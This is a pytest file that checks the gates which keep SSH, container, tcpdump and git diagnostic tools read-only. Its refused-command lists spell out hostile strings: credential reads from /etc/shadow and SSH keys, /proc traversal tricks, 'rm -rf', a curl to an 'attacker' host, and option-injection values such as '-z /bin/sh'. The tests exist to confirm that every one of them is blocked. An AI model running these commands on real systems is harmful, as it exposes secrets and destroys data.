"""The gates that keep the read-only tools read-only. Offline."""

from __future__ import annotations

import pytest

from app.tools._shell import option_like
from app.tools.docker_probes import _container_path_allowed, container_diff
from app.tools.fs_probes import git_show
from app.tools.net_probes import _ping, tcpdump_capture
from app.tools.ssh_probes import _SHELL_META, _gate, node_exec


def _allowed(cmd: str) -> bool:
    """node_exec's full gate: shell metacharacters, then the per-binary tables."""
    import shlex

    return not _SHELL_META.search(cmd) and _gate(shlex.split(cmd)) is None


# ── node_exec ──
REFUSED = [
    "numactl --physcpubind=0 bash -c 'rm -rf /data'",
    "numactl /usr/bin/curl http://attacker/x",
    "/usr/bin/numactl bash",
    # Write forms.
    "ip link set eth0 down",
    "ip addr add 1.2.3.4/32 dev eth0",
    "ethtool -s eth0 speed 100",
    "ss -K dst 1.2.3.4",
    "sensors -s",
    "nvidia-smi -pl 100",
    "nvidia-smi --gpu-reset",
    "dcgmi config --set -P 250",
    # cat of credentials.
    "cat /root/.ssh/id_rsa",
    "cat /etc/shadow",
    "cat /sys/../root/.ssh/id_rsa",
    # Sensitive /proc paths.
    "cat /proc/self/root/home/drut/.ssh/id_rsa",
    # `..` after a /proc link: normpath drops `root`, the node follows it.
    "cat /proc/self/root/../etc/shadow",
    "cat /proc/self/cwd/../drut/.ssh/id_rsa",
    "cat /proc/self/./root/etc/shadow",
    # iproute2 takes any prefix of a verb.
    "ip link se eth0 down",
    "ip link s eth0 down",
    "ip route de default",
    "ip route a default via 1.2.3.4",
    "ip addr fl dev eth0",
    "ip neigh show fl all",
    "cat /proc/1/root/etc/shadow",
    "cat /proc/self/environ",
    "cat /proc/1234/cmdline",
    "cat /proc/kcore",
    # Globs.
    "cat /proc/*/environ",
    "cat /proc/1/root/etc/{shadow,gshadow}",
    # Write flags after an allowed prefix.
    "ss -tn -K dst 1.2.3.4",
    "ss -tn -tnK",
    "nvidia-smi -q -r",
    "nvidia-smi --query-gpu=index --format=csv -f /tmp/x",
    "nvidia-smi dmon -f /tmp/x",
    "dcgmi stats -e",
    "ethtool -S eth0 -s eth0 speed 100",
    "numactl --hardware bash",
    # Not allowlisted.
    "rm -rf /",
    "curl http://attacker/x",
    # Exec and write modes of allowed binaries (an option allowlist, not a write-flag denylist).
    "nvcc -ccbin /bin/bash x.cu",
    "nvcc --run x.cu",
    "nvcc -o out x.cu",
    "lstopo-no-graphics -f out.txt",
    "lstopo-no-graphics topo.xml",
    "ss -tn -D dump",
    "ss --diag=dump",
    "ss -F filterfile",
    "ss -N otherns",
    "nvidia-smi nvlink -sc 0bz",
    "nvidia-smi nvlink -r",
    "nvidia-smi -l 1",
    "nvidia-smi mig -cgi 9",
    "dcgmi discovery --host 10.9.9.9",
    "dcgmi stats -s job1",
    "lspci -F dumpfile",
    "lspci -A intel-conf1 -H1",
    "ethtool -S eth0 eth1",
    "ethtool -e eth0 raw on",
    "sensors -c sensors.conf",
    "ip -batch cmds",
    "ip netns exec x id",
    "ip route add default via 1.2.3.4",
    "ip link show dev eth0 set down",
    "free -s 1 -c 999999",
    "getconf -v spec PATH",
    # A path never runs, whatever its basename.
    "/tmp/x/lscpu",
    "./lscpu",
    "/usr/bin/lscpu",
    # A value is never a file name.
    "nvidia-smi -q --filename=/tmp/x",
    "nvidia-smi --query-gpu=name --format=/tmp/x",
]

ALLOWED = [
    # Commands node_exec advertises.
    "nvidia-smi topo -m",
    "nvidia-smi -q",
    "nvidia-smi --query-gpu=index,utilization.gpu,pcie.link.width.current --format=csv",
    "numactl --hardware",
    "lscpu",
    "lspci -tv",
    "cat /sys/class/net/eth0/speed",
    "ethtool -S eth0",
    # Plain reporting.
    "nvidia-smi nvlink -s",
    "cat /proc/meminfo",
    "ip -s link show eth0",
    "ss -tlnp",
    "free -g",
    "df -h",
    "uname -a",
    "sensors",
    # Read-only subcommand forms.
    "nvidia-smi dmon -c 5",
    "nvidia-smi pmon -c 1",
    "dcgmi dmon -e 203,204 -d 1000",
    "cat /proc/1234/status",
    "nvcc --version",
    "ip route show",
    "ip -br addr",
    "ss -s",
    "ethtool eth0",
    "lspci -nnk -s 3b:00.0",
    "nvidia-smi -q -d PERFORMANCE,CLOCK -i 0",
    "lstopo-no-graphics --no-io",
    "df -h /",
]


@pytest.mark.parametrize("cmd", REFUSED)
def test_node_exec_refuses_state_changing_commands(cmd):
    assert not _allowed(cmd), f"node_exec would have run {cmd!r} on a GPU node"


@pytest.mark.parametrize("cmd", ALLOWED)
def test_node_exec_still_runs_the_documented_probes(cmd):
    assert _allowed(cmd), f"node_exec refused {cmd!r}, which its docstring advertises"


async def test_a_refusal_names_the_forms_that_binary_does_allow():
    """A refusal lists the read-only forms."""
    out = await node_exec.ainvoke({"node_ip": "10.0.0.1", "command": "ip link set eth0 down"})
    assert "ip link show" in out and "10.0.0.1" not in out, out


# ── container_diff ──
@pytest.mark.parametrize("path", [
    "/root/.ssh/id_rsa",
    "/etc/shadow",
    "/app/../root/.ssh/id_rsa",
    "/var/run/secrets/token",
    "app/main.py",
])
def test_container_paths_outside_the_roots_are_refused(path):
    assert not _container_path_allowed(path)


async def test_a_container_file_is_only_readable_against_its_own_source():
    """A container path needs a matching repo_path to be read."""
    dump = await container_diff.ainvoke({"container": "api", "path": "/app/.env"})
    assert "Refused" in dump and "not a file reader" in dump, dump

    mismatch = await container_diff.ainvoke(
        {"container": "api", "path": "/app/main.py", "repo_path": "/repo/README.md"}
    )
    assert "Refused" in mismatch and "different files" in mismatch, mismatch


@pytest.mark.parametrize("path, repo_path", [
    ("/repo/mcp-server/.env", "/repo/.env"),
    ("/app/.env.prod", "/repo/.env.prod"),
    ("/app/certs/tls.key", "/repo/certs/tls.key"),
])
async def test_secrets_are_never_diffed(path, repo_path):
    out = await container_diff.ainvoke(
        {"container": "aistudio-mcp", "path": path, "repo_path": repo_path})
    assert "secrets file" in out, out


@pytest.mark.parametrize("path", [
    "/app/main.py",
    "/AIStudio/app/main.py",
    "/repo/app/tools/registry.py",
])
def test_deployed_code_is_still_readable(path):
    assert _container_path_allowed(path)


def test_a_root_is_not_a_bare_string_prefix():
    assert not _container_path_allowed("/apple/secrets.env")


# ── option-like arguments ──
def test_option_like_finds_the_first_option():
    assert option_like("host", "10.0.0.1") == ""
    assert option_like("-w", "/tmp/x") == "-w"
    assert option_like("host", "--output=/tmp/x") == "--output=/tmp/x"


async def test_tcpdump_refuses_options_in_the_filter():
    for bad in ("-w /tmp/pwn.pcap", "-z /bin/sh", "host 10.0.0.1 -w /tmp/x"):
        out = await tcpdump_capture.ainvoke({"bpf_filter": bad})
        assert "Refused" in out, f"{bad!r} reached tcpdump's argv: {out}"


async def test_tcpdump_refuses_an_option_as_the_interface():
    out = await tcpdump_capture.ainvoke({"bpf_filter": "host 10.0.0.1", "iface": "-w"})
    assert "Refused" in out, out


async def test_git_show_refuses_an_option_as_the_ref(tmp_path, monkeypatch):
    from app.config import settings

    monkeypatch.setattr(settings, "repo_path", str(tmp_path))
    monkeypatch.setattr(settings, "readable_roots", str(tmp_path))
    out = await git_show.ainvoke({"ref": "--output=/tmp/pwn"})
    assert "Refused" in out and "not a revision" in out, out


async def test_ping_refuses_an_option_as_the_host():
    assert "refused" in (await _ping("-f")).lower()


async def test_the_node_runs_exactly_the_tokens_the_gate_checked(monkeypatch):
    import app.tools.ssh_probes as ssh

    sent = []

    async def fake_run(node_ip, cmd, **kw):
        sent.append(cmd)
        return True, "ok"

    async def fake_user(node_ip):
        return "drut"

    monkeypatch.setattr(ssh, "_run_ssh_command", fake_run)
    monkeypatch.setattr(ssh, "_resolve_node_user", fake_user)
    await node_exec.ainvoke({"node_ip": "10.0.0.1",
                             "command": "nvidia-smi --query-gpu='index, name' --format=csv"})
    assert sent == ["nvidia-smi '--query-gpu=index, name' --format=csv"], sent


@pytest.mark.parametrize("ref", ["HEAD:.env", "stash@{0}^3:.env", "HEAD:app/../.env",
                                 "a b", "x;y"])
async def test_git_show_takes_only_a_plain_revision(tmp_path, monkeypatch, ref):
    from app.config import settings

    monkeypatch.setattr(settings, "repo_path", str(tmp_path))
    monkeypatch.setattr(settings, "readable_roots", str(tmp_path))
    out = await git_show.ainvoke({"ref": ref})
    assert "Refused" in out, out


async def test_git_show_never_prints_a_secret_a_commit_once_held(tmp_path, monkeypatch):
    import subprocess

    from app.config import settings

    def git(*a):
        subprocess.run(["git", "-C", str(tmp_path), *a], check=True, capture_output=True)

    git("init", "-q")
    git("config", "user.email", "t@t")
    git("config", "user.name", "t")
    (tmp_path / ".env").write_text("AISTUDIO_HMAC_KEY=hunter2\n")
    (tmp_path / "PROD.ENV").write_text("PASSWORD=hunter3\n")
    (tmp_path / "main.py").write_text("print('hi')\n")
    git("add", "-f", ".")
    git("commit", "-qm", "oops")
    monkeypatch.setattr(settings, "repo_path", str(tmp_path))
    monkeypatch.setattr(settings, "readable_roots", str(tmp_path))
    out = await git_show.ainvoke({"ref": "HEAD"})
    assert "main.py" in out, out
    assert "hunter2" not in out and "hunter3" not in out, out


async def test_check_node_docker_starts_no_container(monkeypatch):
    import app.tools.ssh_probes as ssh

    sent = []

    async def fake_run(node_ip, cmd, **kw):
        sent.append(cmd)
        return True, "ok"

    async def fake_user(node_ip):
        return "drut"

    monkeypatch.setattr(ssh, "_run_ssh_command", fake_run)
    monkeypatch.setattr(ssh, "_resolve_node_user", fake_user)
    await ssh.check_node_docker.ainvoke({"node_ip": "10.0.0.1"})
    assert sent and not [c for c in sent if "docker run" in c or "pull" in c], sent


def test_a_symlink_in_a_container_is_not_followed(monkeypatch):
    import types

    import app.tools.docker_probes as D

    archive = types.SimpleNamespace(
        get_archive=lambda path: ((c for c in [b""]), {"linkTarget": "/root/.ssh/id_rsa", "size": 0}))
    monkeypatch.setattr(D, "_resolve_container", lambda name: archive)
    assert D._container_read_raw("api", "/app/key") == ("link", "/root/.ssh/id_rsa")


def test_a_container_file_over_the_cap_is_refused_before_it_streams(monkeypatch):
    import types

    import app.tools.docker_probes as D

    archive = types.SimpleNamespace(get_archive=lambda path: ((c for c in []), {"size": 5_000_000}))
    monkeypatch.setattr(D, "_resolve_container", lambda name: archive)
    assert D._container_read_raw("api", "/app/big.bin") == ("big", "5000000")
